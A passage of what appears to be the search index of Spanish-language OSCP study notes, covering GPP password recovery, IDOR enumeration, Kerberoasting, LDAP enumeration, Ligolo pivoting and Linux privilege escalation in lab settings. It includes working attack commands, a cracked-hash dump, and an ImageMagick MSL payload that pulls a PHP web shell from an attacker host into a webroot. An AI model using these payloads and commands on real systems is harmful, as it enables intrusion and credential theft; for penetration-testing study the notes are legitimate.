gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.\n[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.\n</code></pre>"},{"location":"OSCP/gpp/#using-crackmapexecs-gpp_autologin-module","title":"Using CrackMapExec's gpp_autologin Module","text":"<pre><code>GNT@htb[/htb]$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\\forend:Klmcargo2 \nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']\nGPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']\n</code></pre>"},{"location":"OSCP/http-verb-tampering/","title":"HTTP verb tampering","text":"<ul> <li>hay 9 verbos HTTP, los m\u00e1s comunes son:<ul> <li>GET</li> <li>POST</li> <li>PUT</li> <li>DELETE</li> <li>PATCH</li> <li>HEAD</li> <li>OPTIONS</li> <li>TRACE</li> <li>CONNECT</li> </ul> </li> <li>Entonces si una aplicaci\u00f3n web no valida los verbos HTTP, se puede hacer un ataque de HTTP verb tampering.</li> <li>Un ataque de HTTP verb tampering es un ataque que se basa en la manipulaci\u00f3n de los verbos HTTP para realizar acciones no autorizadas.</li> <li>Por ejemplo, si una aplicaci\u00f3n web permite el uso del verbo DELETE, un atacante podr\u00eda enviar una solicitud DELETE a un recurso que no deber\u00eda ser eliminado.</li> <li>Para prevenir este tipo de ataques, se deben restringir los verbos HTTP permitidos en la aplicaci\u00f3n web.</li> <li>O con PUT se puede subir un archivo a un servidor.</li> <li>O con TRACE se puede hacer un ataque de Cross-Site Tracing.</li> <li>O con CONNECT se puede hacer un ataque de HTTP tunneling, etc etc.</li> </ul>"},{"location":"OSCP/idor/","title":"IDOR (Insecure Direct Object Reference)","text":"<ul> <li>IDOR es una vulnerabilidad de seguridad que se produce cuando una aplicaci\u00f3n web expone referencias directas a objetos internos.</li> <li>Por ejemplo, si una aplicaci\u00f3n web utiliza un par\u00e1metro num\u00e9rico para acceder a un recurso, un atacante podr\u00eda modificar ese par\u00e1metro para acceder a recursos no autorizados.</li> </ul>"},{"location":"OSCP/idor/#identificando-idors","title":"Identificando IDORs","text":"<ul> <li>Para identificar IDORs, se pueden seguir los siguientes pasos:<ul> <li>Identificar los par\u00e1metros que se utilizan para acceder a recursos.</li> <li>Modificar esos par\u00e1metros para acceder a recursos no autorizados.</li> <li>Observar si la aplicaci\u00f3n web permite el acceso a recursos no autorizados.</li> </ul> </li> </ul>"},{"location":"OSCP/idor/#llamadas-ajax","title":"Llamadas AJAX","text":"<ul> <li>En las llamadas AJAX, se pueden identificar IDORs de la siguiente manera:<ul> <li>Inspeccionar las llamadas AJAX en la pesta\u00f1a Network de las herramientas de desarrollo del navegador.</li> <li>Identificar los par\u00e1metros que se utilizan en las llamadas AJAX.</li> <li>Modificar esos par\u00e1metros para acceder a recursos no autorizados.</li> <li>Observar si la aplicaci\u00f3n web permite el acceso a recursos no autorizados.</li> </ul> </li> </ul>"},{"location":"OSCP/idor/#enumeracion-masiva-con-idors","title":"Enumeraci\u00f3n masiva con IDORs","text":"<ul> <li>Para realizar una enumeraci\u00f3n masiva con IDORs, se pueden seguir los siguientes pasos:<ul> <li>Identificar los par\u00e1metros que se utilizan para acceder a recursos.</li> <li>Crear una lista de valores posibles para esos par\u00e1metros.</li> <li>Automatizar la modificaci\u00f3n de esos par\u00e1metros para acceder a recursos no autorizados.</li> <li>Observar si la aplicaci\u00f3n web permite el acceso a recursos no autorizados.</li> </ul> </li> <li>Script de ejemplo:</li> </ul> <pre><code>#!/bin/bash\n\nurl=\"http://SERVER_IP:PORT\"\n\nfor i in {1..10}; do\n        for link in $(curl -s \"$url/documents.php?uid=$i\" | grep -oP \"\\/documents.*?.pdf\"); do\n                wget -q $url/$link\n        done\ndone\n</code></pre>"},{"location":"OSCP/imagemagick-rce/","title":"Image magick RCE attack","text":"<ul> <li>Articulo</li> <li>Si encontramos alg\u00fan aplicativo utilizando ImageMagick, podemos intentar ejecutar c\u00f3digo remoto a trav\u00e9s de la carga de una imagen maliciosa o de un magick scripting language (MSL).<ul> <li>los MSL son archivos XML que contienen instrucciones para ImageMagick.</li> <li>La carga de un MSL malicioso puede permitir la ejecuci\u00f3n de c\u00f3digo arbitrario en el servidor.</li> </ul> </li> </ul>"},{"location":"OSCP/imagemagick-rce/#ejemplo-de-payload","title":"Ejemplo de payload","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;image&gt;\n &lt;read filename=\"http://10.10.14.58/positive.png\" /&gt;\n  &lt;write filename=\"/var/www/html/intentions/public/shell.php\" /&gt;\n&lt;/image&gt;\n</code></pre> <ul> <li>Siendo positive: <code>convert xc:red -set 'Copyright' '&lt;?php echo shell_exec($_REQUEST[\"cmd\"]); ?&gt;' positive.png</code><ul> <li><code>convert</code> es el comando de ImageMagick para convertir im\u00e1genes.</li> <li><code>xc:red</code> es un color s\u00f3lido rojo.</li> <li>Entonces lo que hace esto es crear una imagen roja y establecer el campo de metadatos 'Copyright' con el contenido del script PHP.</li> </ul> </li> </ul>"},{"location":"OSCP/imagemagick-rce/#ejemplo-de-peticion-http-para-subir-este-payload","title":"Ejemplo de petici\u00f3n HTTP para subir este payload","text":"<pre><code>POST /api/v2/admin/image/modify?path=vid:msl:/tmp/php*&amp;effect=charcoal HTTP/1.1\nHost: 10.10.11.220\nContent-Length: 294\nX-XSRF-TOKEN: eyJpdiI6IlA2Qnpka1pWQm1nTG5RK3lFc05jekE9PSIsInZhbHVlIjoiOEljTnJWb0pLczFYZmtJcU5nWkdSVjE5SVhrYnU1VWZuSW4vZnRjZWVrNzNJWnNpTjYzUCt4N2dyM1BOaDRHQnJncDdqUmxoeHRxV3pCYnVoa2w4VWhEcGhSSWVGV3ZpVWljMElKY1EzczI3NEYzU0FSZXNmZVNWKy9iTUlxeFciLCJtYWMiOiJhNzkzMjgzZTRkNzAxMTliMjk2ZmI3YTgxMzk5YzQ5OTIxY2IwYmEzNDI4OGNkMGRmM2I5NWE3OGZmMTYwYWUzIiwidGFnIjoiIn0=\nX-Requested-With: XMLHttpRequest\nAccept-Language: en-US,en;q=0.9\nAccept: application/json, text/plain, */*\nContent-Type: multipart/form-data; boundary=ABC\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36\nOrigin: http://10.10.11.220\nReferer: http://10.10.11.220/admin\nAccept-Encoding: gzip, deflate, br\nCookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vMTAuMTAuMTEuMjIwL2FwaS92Mi9hdXRoL2xvZ2luIiwiaWF0IjoxNzQ0MDQ5MzMzLCJleHAiOjE3NDQwNzA5MzMsIm5iZiI6MTc0NDA0OTMzMywianRpIjoiSlRrV0NnTm5RSFJOZ29QQiIsInN1YiI6IjEiLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.o1yh_a8A1SiugE90Ia6xVhk3Ap8RQSC0AZPW9lCaFPo; XSRF-TOKEN=eyJpdiI6IlA2Qnpka1pWQm1nTG5RK3lFc05jekE9PSIsInZhbHVlIjoiOEljTnJWb0pLczFYZmtJcU5nWkdSVjE5SVhrYnU1VWZuSW4vZnRjZWVrNzNJWnNpTjYzUCt4N2dyM1BOaDRHQnJncDdqUmxoeHRxV3pCYnVoa2w4VWhEcGhSSWVGV3ZpVWljMElKY1EzczI3NEYzU0FSZXNmZVNWKy9iTUlxeFciLCJtYWMiOiJhNzkzMjgzZTRkNzAxMTliMjk2ZmI3YTgxMzk5YzQ5OTIxY2IwYmEzNDI4OGNkMGRmM2I5NWE3OGZmMTYwYWUzIiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImsvS1lzSUNTaVdqdDhNZ3FkUUYvZ2c9PSIsInZhbHVlIjoiNzdqdk82MHlOdEYrQWxnM2UrWGtXQWZob3VZdk5pVjdKOHFGRFMxYUlPWUdkaUZpNjdXVVNjUEc3S01ZQisxRHk5MzBoelpTWldlZ3hMYkkwVlZSalh1SHM4aGJHRGFwWVFoMXVDcTY0a21JbDFCemFGTnM3c3RITWRiNHZJODEiLCJtYWMiOiI0YTU4NmY1ZWI1NDVjMjM0MTljOTk0MzA5MjgwNzY3Y2I0ZDY3M2UwZWVlMTNlNmYxYTg5Y2I4OGM5YTM3NDc4IiwidGFnIjoiIn0%3D\nConnection: keep-alive\n--ABC\nContent-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"\nContent-Type: text/plain\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;image&gt;\n &lt;read filename=\"http://10.10.14.58/positive.png\" /&gt;\n  &lt;write filename=\"/var/www/html/intentions/public/shell.php\" /&gt;\n&lt;/image&gt;\n--ABC--\n</code></pre> <ul> <li>Esta vulnerabilidad es clasificada como RCE.</li> </ul>"},{"location":"OSCP/kerberoasting/","title":"Kerberoasting","text":"<ul> <li>Este ataque sirve para obtener credenciales de cuentas de servicios que est\u00e1n configurados con la autenticaci\u00f3n Kerberos.</li> <li>En AD comunmente las cuentas de servicios tienen privilegios muy elevados.</li> <li>M\u00e1s info</li> </ul>"},{"location":"OSCP/kerberoasting/#como-funciona","title":"Como funciona","text":"<ol> <li>Solicitud TGS</li> <li>Obtener Ticket.</li> <li>Extraerlo con mimikatz o rubeus</li> <li> <p>Fuerza bruta o pass the ticket</p> </li> <li> <p><code>sudo impacket-GetUserSPNs DOMAIN.LOCAL/USER:password -dc-ip IP -request</code></p> </li> <li>Guardar hash</li> <li><code>hashcat -m 13100 hash.txt wordlist.txt</code></li> </ol>"},{"location":"OSCP/kerberoasting/#listar-cuentas","title":"Listar cuentas","text":"<ul> <li><code>impacket-GetUserSPNs -dc-ip IP DOMAIN.LOCAL/USER</code></li> <li><code>impacket-GetUserSPNs -request -dc-ip 172.16.139.3 -target-domain trilocor.local trilocor.local/pthorpe</code></li> <li>Ejemplo:</li> </ul> <pre><code>Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation\n\nPassword:\nServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation \n---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------\nbackupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  &lt;never&gt;               \nsts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  &lt;never&gt;               \nMSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  &lt;never&gt;               \nMSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  &lt;never&gt;               \nMSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  &lt;never&gt;               \nadfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  &lt;never&gt; \n</code></pre>"},{"location":"OSCP/kerberoasting/#chequear-cuenta-post-crackeo","title":"Chequear cuenta post crackeo","text":"<ul> <li><code>sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!</code></li> </ul>"},{"location":"OSCP/kerberoasting/#extraer-tickets-desde-windows","title":"Extraer tickets desde Windows","text":"<ul> <li><code>Rubeus.exe asktgt /user:&lt;usuario&gt; /rc4:&lt;contrase\u00f1a&gt;</code></li> <li><code>Rubeus.exe tgtreq /user:&lt;usuario&gt; /rc4:&lt;spn&gt;</code></li> <li><code>Rubeus tgtdeleg /ticket:&lt;ticket_file&gt;</code><ul> <li>mimikatz: <code>mimikatz.exe \"kerberos::list\" \"exit\"</code></li> </ul> </li> </ul>"},{"location":"OSCP/kerberoasting/#targeted-kerberoasting","title":"Targeted kerberoasting","text":"<ul> <li>Hay veces que nos dan la opci\u00f3n de hacer kerberoasting a un usuario espec\u00edfico.</li> <li> <p>Esto es enumerable con bloodhound</p> </li> <li> <p><code>python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d Administrator.htb --dc-ip 10.10.11.42</code></p> </li> <li>Recomiendo actualizar el reloj de la maquina al DC</li> <li>sudo ntpdate 10.10.11.42</li> </ul> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[~/targetedKerberoast]\n\u2514\u2500$ python3 targetedKerberoast.py -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -d Administrator.htb --dc-ip 10.10.11.42\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[+] Printing hash for (ethan)\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$Administrator.htb/ethan*$d2cc01fa83eca8ded17431506037a011$43b967cdbf4d38340035db43ec4d10a7a79aca4e97e255ff9680e236f05e094f78847407e361a07131fe0950df47e74f1d2b4d417dce7201ca0bdbc7ffba1ce78de85db45cb3e68013f2e4b33c0f6d5ea016534c014667c0cc4d95ed3203e77584355f1641ec66b2e21861a661ceaa52004a6d4ec69ddec2f80b2329e9a6915234dfcd438cd2e441aa9aecb4e63c91fcaf7c24ce8af26331b43d5c55c60b5a1623239213452e740f948219aac770cd1feaa2aaf95644ea7f2526a538f00945dcd24b234494024a0cba0d1cd60c7e81fb10232cbdeabc334ae5486169f89eebc32ff2bde2627a60e497503db27b2533edbcad8018e99ae81d452f31c13879d34d6d0741fcf4c6eb01ee4e3d19658691e630e6e250fed51a4836fc33aa0ab17928cc082e69b9a68d618187f30bb1c35070a2234e3d5171bbb8344e478fbf772cf927812369fef3647325e26517a748ac124876af09ce396544c239211be970fc95408f70f6da0514f9d9592b76382aedf6dd26d89f568ecba047e34bfb10a475ccd7b157b845483a22a6cad09f5854b6158adec4dff36303973e4132dba9b93cfc4c2cdfb7d40dfb3cdf0f510338710f5070ff4c440c03ff07fc3c4c0b23532197b855a3df1de2560de73e2ec2f69c24bd99a02b33bede193aa228aa09d1aa2de92d3aa402d0a91c1b5c64a2270a7a533746e0a158ef76a091b64133e48a3beee7b5f22642ec76f3b238a08b18a42dadcd32c4f1d809fb11876e45b7a9f8b1471301a8f30afc5c3d5f1ec4d8dc486bb2bfc5dfa89fb09da0c4db5b7777c61f30f92d9dbb194637e9219b403febe7f8a6a20eb2f289330609a6b8f60aefc0a537a7d26d8338796eb38f763b52ee17b81ee901ac8f80547b7a53fab8bc0f237fc4859fb9f37b16a82f1e5eba6977327671928d65d0d541b7c2a1eb9d4e530cc35923951b32d86cb2f80924db1e8afad6635c698e8ca868a0b5cf4b87b048dafb11f4be5a9dc20fabd62b8712dc37b826962e8a947c41148867fdaa4761796a88d40d6f70fc27996f364143a017f222626cccc0352a9980310717ca23cb8800b6dffe901fbddc3e07b62311380ef6bdad9e2e6f85a3165686f323ae68c9c2a8c8278a3bb75c308ad8e0a3ab3e2ac49ef68df6b06045c12084a1e665ea582f48a507368c848131b2ff34cbba084abeda028fe7068e294a39e18e62d18bade08943c1dea4dbf7e309a64440128b8f8ef4c0099df8be2dc3433ce074e077048443329450f7273b4fbeee4cfc0038c7d1a8660e757659bb93c2f352df19c014e9678a2565ce29ea4badd2e14ff06ea43c40c70a26533bef578a9e473d547ef509bc1a38c323330508994d0a766b502c4a8b98cdc2a8663c3d917283550c01750cfa7883fddc0e334a3cbe614cbb93470a7d95c02f9088d42eb1cff0995ebbef0e2ea4b5b54e00c371b373ca201ad395cd9cea00527fad0d6f017e8c917578759c8369180887f3b20895f233b25f34b1b7a4a927d89c915acd19d5796526d60a965d9ebf\n</code></pre>"},{"location":"OSCP/ldapEnum/","title":"LDAP Enumeration","text":""},{"location":"OSCP/ldapEnum/#tools","title":"Tools","text":"<ul> <li>LDAPSearch</li> <li>python-ldapdomaindump</li> <li>msLDAPDump</li> <li>etc TODO</li> </ul>"},{"location":"OSCP/ldapEnum/#comandos-ldapsearch","title":"Comandos ldapsearch","text":""},{"location":"OSCP/ldapEnum/#anonimo","title":"Anonimo","text":"<ul> <li><code>ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\\*)'</code></li> <li><code>ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\\*)' namingContexts</code></li> <li><code>ldapsearch -LLL -x -H ldap://test.local -b'' -s base '(objectclass=\\*)' defaultNamingContext</code></li> <li>Ahora con el namingContext podemos hacer un search:<ul> <li><code>ldapsearch -LLL -x -H ldap://test.local -b 'DC=test,DC=local' '(objectclass=\\*)'</code></li> <li><code>ldapsearch -LLL -x -H ldap://test.local -b 'DC=test,DC=local'</code></li> </ul> </li> </ul>"},{"location":"OSCP/ligolo/","title":"Alternativa Ligolo","text":"<ul> <li>Ligolo es una buena alternativa sin tener que utilizar SOCKS ni proxychains que suelen ser engorrosos y generan mucha latencia en la red.</li> <li> <p>Primero hay que descargarse los binarios de agente y proxy</p> </li> <li> <p>En maquina atacante: <code>sudoligolo-proxy -selfcert</code> <pre><code>ligolo-ng \u00bb interface_create --name \"pivot\"\nINFO[0022] Creating a new \"pivot\" interface...          \nINFO[0022] Interface created!                           \nligolo-ng \u00bb  \n</code></pre></p> </li> <li>En maquina victima: <code>./agent -connect ipKALI:11601 -ignore-cert</code></li> <li>En maquina atacante <pre><code>ligolo-ng \u00bb session\n? Specify a session : 1 - ubuntu@WEB01 - 10.129.115.194:42414 - 00a21e69-4e53-4dec-9139-fb12ae570838\n</code></pre></li> <li>Y ahora iniciamos el tunnel<ul> <li>Tambi\u00e9n podemos usar <code>autoroute</code> <pre><code>[Agent : ubuntu@WEB01] \u00bb tunnel_start --tun pivot\n[Agent : ubuntu@WEB01] \u00bb INFO[0334] Starting tunnel to ubuntu@WEB01 (00a21e69-4e53-4dec-9139-fb12ae570838) \n</code></pre></li> </ul> </li> </ul>"},{"location":"OSCP/ligolo/#crear-routing-hacia-la-interfaz-que-queremos-alcanzar","title":"Crear routing hacia la interfaz que queremos alcanzar","text":"<pre><code>[Agent : ubuntu@WEB01] \u00bb ifconfig\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Interface 0                        \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Name         \u2502 lo                  \u2502\n\u2502 Hardware MAC \u2502                     \u2502\n\u2502 MTU          \u2502 65536               \u2502\n\u2502 Flags        \u2502 up|loopback|running \u2502\n\u2502 IPv4 Address \u2502 127.0.0.1/8         \u2502\n\u2502 IPv6 Address \u2502 ::1/128             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Interface 1                                     \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Name         \u2502 ens192                           \u2502\n\u2502 Hardware MAC \u2502 00:50:56:b0:df:18                \u2502\n\u2502 MTU          \u2502 1500                             \u2502\n\u2502 Flags        \u2502 up|broadcast|multicast|running   \u2502\n\u2502 IPv4 Address \u2502 10.129.115.194/16                \u2502\n\u2502 IPv6 Address \u2502 dead:beef::250:56ff:feb0:df18/64 \u2502\n\u2502 IPv6 Address \u2502 fe80::250:56ff:feb0:df18/64      \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Interface 2                                   \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Name         \u2502 ens224                         \u2502\n\u2502 Hardware MAC \u2502 00:50:56:b0:92:e9              \u2502\n\u2502 MTU          \u2502 1500                           \u2502\n\u2502 Flags        \u2502 up|broadcast|multicast|running \u2502\n\u2502 IPv4 Address \u2502 172.16.5.129/23                \u2502\n\u2502 IPv6 Address \u2502 fe80::250:56ff:feb0:92e9/64    \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n[Agent : ubuntu@WEB01] \u00bb interface_add_route --name pivot --route 172.16.5.129/23\nINFO[0423] Route created.                               \n[Agent : ubuntu@WEB01] \u00bb  \n</code></pre>"},{"location":"OSCP/ligolo/#agregar-listeners","title":"Agregar listeners","text":""},{"location":"OSCP/ligolo/#un-proxy-listener-lo-que-hace-es-redirigir-puertos-de-la-maquina-pivote-hacia-nuestra-maquina-atacante","title":"Un proxy listener lo que hace es redirigir puertos de la maquina pivote hacia nuestra maquina atacante.","text":"<ul> <li><code>listener_list</code>: Para listar los listeners activos</li> <li><code>listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444</code>: Maquina pivote 1234 =&gt; Maquina kali escucha 4444</li> </ul>"},{"location":"OSCP/linuxPrivEsc/","title":"Linux Privilege Escalation","text":""},{"location":"OSCP/linuxPrivEsc/#enumeration","title":"Enumeration","text":"<ul> <li>Generalmente vamos a empezar utilizando LinEnum, Linpeas, exploitSuggester, linux-exploit-suggester, etc.</li> <li>Hay varios puntos importantes a enumerar:<ul> <li>Version del OS</li> <li>Version del Kernel</li> <li>Servicios ejecutandose</li> </ul> </li> <li>Tambi\u00e9n podemos revisar <code>sudo -l</code> para ver que comandos podemos ejecutar con sudo.</li> <li>Podemos revisar los cronjobs <code>ls -la /etc/cron.daily/</code> y <code>ls -la /etc/cron.hourly/</code></li> <li>Encontrar directorios con acceso a escritura: <code>find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</code></li> <li>Encontrar archivos con acceso a escritura: <code>find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</code></li> <li>Encontrar scripts: <code>find / -type f -name \"*.sh\" 2&gt;/dev/null | grep -v \"src\\|snap\\|share\"</code></li> <li>Corriendo servicios como root: <code>ps aux | grep root</code></li> </ul>"},{"location":"OSCP/linuxPrivEsc/#path-abuse","title":"Path Abuse","text":"<ul> <li>Definici\u00f3n: PATH es una variable de entorno que contiene una lista de directorios a los que el sistema busca ejecutables.<ul> <li>Ejemplo: cuando hacemos <code>cat /etc/passwd</code> el sistema busca el ejecutable <code>cat</code> en <code>/bin/cat</code> en los directorios especificados en la variable PATH.</li> </ul> </li> <li>Podemos chequear el contenido de la variable PATH con <code>echo $PATH</code></li> <li>Crear un script o programa especificado en el PATH lo hace ejecutable en cualquier lugar del sistema.</li> <li>Ejemplo de abuso: <pre><code>htb_student@NIX02:~$ touch ls\nhtb_student@NIX02:~$ echo 'echo \"PATH ABUSE!!\"' &gt; ls\nhtb_student@NIX02:~$ chmod +x ls\nhtb_student@NIX02:~$ ls\nPATH ABUSE!!\n</code></pre></li> </ul>"},{"location":"OSCP/linuxPrivEsc/#ejemplo-de-path-abuse-con-setuid-permissions","title":"Ejemplo de path abuse con setuid permissions","text":"<ul> <li>Usamos: <code>find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null</code></li> <li>Nos aparece este binario <code>/bin/sysinfo</code> desconocido.</li> <li>Usamos <code>strings /bin/sysinfo</code> y vemos que utiliza el comando <code>lshw</code> para mostrar informaci\u00f3n del sistema.</li> <li>Entonces utilizamos strace para ver como se comporta el binario: <code>strace -f /bin/sysinfo 2&gt;&amp;1 | grep execve</code></li> <li>Y vemos que llama a este programa sin un path definido.</li> <li>Entonces podemos redefinir el path de este binario hacia un binario malicioso para elevar privilegios</li> <li><code>echo -e '#!/bin/bash\\n/bin/bash -p' &gt; lshw</code></li> <li><code>chmod +x lshw</code></li> <li><code>export PATH=</code>pwd<code>:$PATH</code></li> <li><code>/bin/sysinfo</code> Y a partir de ac\u00e1 ya tenemos acceso root</li> </ul>"},{"location":"OSCP/linuxPrivEsc/#setuid-permissions","title":"Setuid permissions","text":"<ul> <li>Definici\u00f3n: Setuid permissions permite a un proceso ejecutar comandos como el usuario que lo ejecuta. Set User ID upon Execution (setuid)</li> <li>El setuid bit aparece como una <code>s</code> en el lugar del bit de ejecuci\u00f3n en el owner.</li> <li><code>find / -user root -perm -4000 -exec ls -ldb {} \\; 2&gt;/dev/null</code></li> </ul>"},{"location":"OSCP/linuxPrivEsc/#setgid-permissions","title":"Setgid permissions","text":"<ul> <li>Definici\u00f3n: Setgid permissions permite a un proceso ejecutar comandos como el grupo que lo ejecuta.</li> <li><code>find / -uid 0 -perm -6000 -type f 2&gt;/dev/null</code></li> </ul>"},{"location":"OSCP/linuxPrivEsc/#capabilities","title":"Capabilities","text":"<ul> <li>Definici\u00f3n: Capabilities permiten a un proceso ejecutar comandos como el usuario que lo ejecuta.</li> <li>Generalmente se usan para ejecutar ciertos comandos como root.</li> <li>setcap definici\u00f3n: setea capabilities para un programa.<ul> <li>ejemplo: podemos usar <code>cap_net_bind_service</code> para poder ejecutar el comando <code>nc -l -p 80</code> como root.</li> <li><code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</code></li> </ul> </li> <li><code>find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;</code>: este comando hace un chequeo de los binarios que tienen capabilities.</li> </ul> Capacidad Descripci\u00f3n <code>cap_sys_admin</code> Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. <code>cap_sys_chroot</code> Permite cambiar el directorio ra\u00edz para el proceso actual, permiti\u00e9ndole acceder a archivos y directorios que de otro modo ser\u00edan inaccesibles. <code>cap_sys_ptrace</code> Permite adjuntar y depurar otros procesos, 